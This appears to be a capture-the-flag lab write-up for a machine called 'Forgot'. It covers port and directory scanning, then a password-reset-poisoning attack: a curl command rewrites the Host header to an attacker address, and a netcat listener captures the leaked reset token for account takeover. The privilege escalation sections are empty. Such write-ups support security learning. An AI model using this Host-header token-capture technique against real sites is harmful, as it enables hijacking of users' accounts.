---
Alias: Forgot
Date: 2022-11-16
Platform: Linux
Category:
Difficulty: Medium
Tags:
Status:
IP: 10.10.11.188
---
![](_resources/2022-11-16-16-01-50.png)
# Forgot
{{Summary}}

## Creds
```
robert-dev-67120
```

## Enumeration

### Port Scan:

```
sudo nmap -sS --open -p- -min-rate 5000 -n -Pn -v `cat ip` -oG nmap/allPorts.nmap

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

```
sudo nmap -sCV -p22,80 `cat ip` -oN nmap/targeted.nmap

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Wed, 16 Nov 2022 21:23:58 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     X-Varnish: 32774
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Wed, 16 Nov 2022 21:23:53 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 219
|     Location: http://127.0.0.1
|     X-Varnish: 6
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://127.0.0.1">http://127.0.0.1</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Wed, 16 Nov 2022 21:23:53 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     X-Varnish: 32770
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Accept-Ranges: bytes
|     Connection: close
|   RTSPRequest, SIPOptions: 
|_    HTTP/1.1 400 Bad Request
|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
|_http-title: Login
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.93%I=7%D=11/16%Time=637554E9%P=x86_64-apple-darwin21.5.0
SF:%r(GetRequest,1DE,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.
SF:1\.2\x20Python/3\.8\.10\r\nDate:\x20Wed,\x2016\x20Nov\x202022\x2021:23:
SF:53\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Le
SF:ngth:\x20219\r\nLocation:\x20http://127\.0\.0\.1\r\nX-Varnish:\x206\r\n
SF:Age:\x200\r\nVia:\x201\.1\x20varnish\x20\(Varnish/6\.2\)\r\nConnection:
SF:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>Redirect
SF:ing\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x20be\x
SF:20redirected\x20automatically\x20to\x20the\x20target\x20URL:\x20<a\x20h
SF:ref=\"http://127\.0\.0\.1\">http://127\.0\.0\.1</a>\.\x20If\x20not,\x20
SF:click\x20the\x20link\.\n")%r(HTTPOptions,117,"HTTP/1\.1\x20200\x20OK\r\
SF:nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.8\.10\r\nDate:\x20Wed,\x2016\
SF:x20Nov\x202022\x2021:23:53\x20GMT\r\nContent-Type:\x20text/html;\x20cha
SF:rset=utf-8\r\nAllow:\x20HEAD,\x20GET,\x20OPTIONS\r\nContent-Length:\x20
SF:0\r\nX-Varnish:\x2032770\r\nAge:\x200\r\nVia:\x201\.1\x20varnish\x20\(V
SF:arnish/6\.2\)\r\nAccept-Ranges:\x20bytes\r\nConnection:\x20close\r\n\r\
SF:n")%r(RTSPRequest,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Fo
SF:urOhFourRequest,1BE,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Wer
SF:kzeug/2\.1\.2\x20Python/3\.8\.10\r\nDate:\x20Wed,\x2016\x20Nov\x202022\
SF:x2021:23:58\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nC
SF:ontent-Length:\x20207\r\nX-Varnish:\x2032774\r\nAge:\x200\r\nVia:\x201\
SF:.1\x20varnish\x20\(Varnish/6\.2\)\r\nConnection:\x20close\r\n\r\n<!doct
SF:ype\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<h
SF:1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\
SF:x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manua
SF:lly\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>
SF:\n")%r(SIPOptions,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Scan
``` sh
whatweb http://`cat ip`

http://10.10.11.188 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.8.10], IP[10.10.11.188], PasswordField[password], Python[3.8.10], Script[module], Title[Login], UncommonHeaders[x-varnish], Varnish, Via-Proxy[1.1 varnish (Varnish/6.2)], Werkzeug[2.1.2]
```

## Checking HTTP (Port 80)
![](_resources/2022-11-16-16-34-43.png)

The website shows a login form which requires a username and password

``` sh
gobuster dir -u http://`cat ip` -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/dir.out --wildcard -t 100 --timeout 20s

/home                 (Status: 302) [Size: 189] [--> /]
/login                (Status: 200) [Size: 5189]
/forgot               (Status: 200) [Size: 5227]
/tickets              (Status: 302) [Size: 189] [--> /]
/reset                (Status: 200) [Size: 5523]

```

Viewing the source of /home I see a note with a username `robert-dev-67120`

``` html
view-source:http://10.10.11.188/
<!-- Q1 release fix by robert-dev-67120 -->
  <script>
  window.console = window.console || function(t) {};
</script>

```
Viewing the source of /forgot there is a script to validate the user

``` html
view-source:http://10.10.11.188/forgot
  <script>
  window.console = window.console || function(t) {};
  function submitForm()
{
    var xmlHttp = new XMLHttpRequest();
    u = document.getElementById("username").value;
    xmlHttp.open( "GET", "/forgot?username="+u, false );
    xmlHttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        document.getElementById("err").innerHTML=xmlHttp.responseText;
      }
      else {
        document.getElementById("err").innerHTML=xmlHttp.responseText;
      }
    }
    xmlHttp.send( null );
}
</script>
```

# Exploit Website
The /forgot page allows Password Reset Poisining by updating the Host: header to the attackers box and catching the request with netcat. 

![](_resources/2022-11-16-17-12-08.png)


```
curl -H "Host: 10.10.14.6:7777" "http://`cat ip`/forgot?username=robert-dev-10036"
Password reset link has been sent to user inbox. Please use the link to reset your password%    
```

This request sends a password reset token.
```
nc -nvlp 7777
Connection from 10.10.11.188:54704
GET /reset?token=OK1NtyRRimTCUtzunNrehbqYmqNv1uHjnuk0a4QC9havN5qs6ZHF7TMDHgVPdModB5hG02MFKhRRVUSctWe0Og%3D%3D HTTP/1.1
Host: 10.10.14.6:7777
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

Reset the password for `robert-dev-10036` by going to the reset link

`http://10.10.11.188/reset?token=%2FV99A54Z2iwLRUXEwe%2FxVhLPPmxSDC8%2BtQrtt1UdpcSKINyYMDZ3ku4cY8kYXoTtZUhkCIqOdrjRgxoZEfXx9g%3D%3D`

Now we can login into the website

![](2022-11-16-17-36-56.png)



## Privilege Escalation



### Privilege Escalation to root



---

# Trophy & Loot
user.txt

root.txt